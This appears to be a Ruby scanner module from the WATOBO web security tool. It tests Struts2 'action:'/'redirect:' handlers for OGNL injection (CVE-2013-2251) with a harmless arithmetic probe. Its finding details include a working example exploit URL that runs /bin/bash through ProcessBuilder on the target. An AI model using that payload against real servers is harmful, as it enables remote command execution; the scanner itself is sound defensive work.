# @private 
module Watobo#:nodoc: all
  module Modules
    module Active
      module Struts2
        
        
        class Default_handler_ognl < Watobo::ActiveCheck
           @@tested_directories = Hash.new
          
          threat =<<'EOF'
A vulnerability introduced by manipulating parameters prefixed with "action:"/"redirect:"/"redirectAction:" allows remote command execution

Source: http://struts.apache.org/release/2.3.x/docs/s2-016.html
CVE: CVE-2013-2251
EOF

#
            details =<<'EOD'           
Example for code execution:
http://your.vulnerable.app/?redirect:%25{(new+java.lang.ProcessBuilder(new+java.lang.String[]{%27/bin/bash%27,%27-c%27,%27touch%20/tmp/pwned%27})).start()}
EOD

            
            measure = "Update Struts2 to version >2.3.15.1"
            
            @info.update(
                         :check_name => 'Struts2 default handlers',    # name of check which briefly describes functionality, will be used for tree and progress views
            :check_group => "Struts",
            :description => "Check for struts2 default handlers which doesn't sanitize parameters.",   # description of checkfunction
            :author => "Andreas Schmidt", # author of check
            :version => "1.0"   # check version
            )
            
            @finding.update(
                            :threat => threat,        # thread of vulnerability, e.g. loss of information
                            :class => "Struts2 - default handlers",    # vulnerability class, e.g. Stored XSS, SQL-Injection, ...
            :type => FINDING_TYPE_VULN,         # FINDING_TYPE_HINT, FINDING_TYPE_INFO, FINDING_TYPE_VULN
            :rating => VULN_RATING_CRITICAL,
            :measure => measure,
            :details => details
            )
          
          def initialize(project, prefs={})
            super(project, prefs)
            
           @vuln_handlers = %w( action redirect redirectAction)
            
            def reset
               @@tested_directories.clear
            end
            
            
          end
          
          
          def generateChecks(chat)    
            begin   
              # 
             path = chat.request.dir
             return true if @@tested_directories.has_key?(path)
             
             @@tested_directories[path] = true
             @vuln_handlers.each do |handler|
                checker = proc {
                  results = {}
                  request = nil
                  response = nil
                  test_request = chat.copyRequest
                     
                  test_value = '?' + CGI::escape("#{handler}:watobo_%{10000-1}")
                  
                  test_request.replaceElement test_value
                  
                  request, response = doRequest(test_request)
                  
                  if response.headers.select{|h| h =~ /^Location:.*(_9999)/}.length > 0
                      
                      addFinding( request, response,
                                 :check_pattern => test_value,
                                 :proof_pattern => "Location:.*_9999",
                                 :test_item => handler,
                                 :chat => chat,
                                 :title => "[#{request.dir}] - #{handler}"
                      )
                  end
                   
                    [ request, response ]
                  }
                  yield checker
               
              end
              
            rescue => bang
              puts bang
              puts bang.backtrace if $DEBUG
              puts "ERROR!! #{Module.nesting[0].name}"
              raise
            end
          end
          
        end
        
      end
    end
  end
end
